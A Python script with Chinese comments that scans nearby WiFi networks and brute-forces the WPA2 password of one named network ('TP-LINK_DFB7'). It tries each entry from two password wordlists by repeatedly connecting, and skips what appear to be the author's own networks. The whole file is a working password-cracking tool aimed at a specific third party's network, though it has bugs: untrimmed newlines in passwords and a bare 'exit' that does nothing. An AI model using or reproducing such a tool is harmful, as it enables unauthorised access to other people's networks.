import pywifi
import time

def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # 获取第一个无线网卡

    iface.scan()  # 扫描
    time.sleep(2)  # 等待扫描完成

    results = iface.scan_results()
    return results

def print_wifi_list(networks):
    for i, network in enumerate(networks):
        print(f"{i+1}. SSID: {network.ssid}, 信号强度: {network.signal}")


def verify_wifi_password(ssid, password):
    # 此函数用于验证WiFi密码
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(5)
    if iface.status() == pywifi.const.IFACE_CONNECTED:
        return True
    else:
        return False

def read_file_lines(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return file.readlines()
    except IOError:
        print(f"无法读取文件: {filename}")
        return []
    
# 主程序
if __name__ == "__main__":
    passwdfiles = ["weak-password-set.txt","wordlist.txt"]
    passwds = []
    for v in passwdfiles:
        passwds += read_file_lines(v)

    print("正在扫描WiFi网络...")
    wifi_list = scan_wifi()
    
    print("\n可用的WiFi网络:")
    print_wifi_list(wifi_list)

    for i,network in enumerate(reversed(wifi_list)):
        if network.ssid == "likewendy":
            continue
        if network.ssid == "ChinaNet-acgx":
            continue
        if network.ssid == "":
            continue
        # if network.signal <= -75:
            # continue
        if network.ssid != "TP-LINK_DFB7":
            continue
        print(f"正在破解{i+1}. SSID: {network.ssid}, 信号强度: {network.signal}")
        for i,passwd in enumerate(passwds):
            if len(passwd) < 8:
                continue
            print(f"对{network.ssid}尝试第{i+1}个密码{passwd}")
            if verify_wifi_password(network.ssid,passwd):
                print("密码正确")
                exit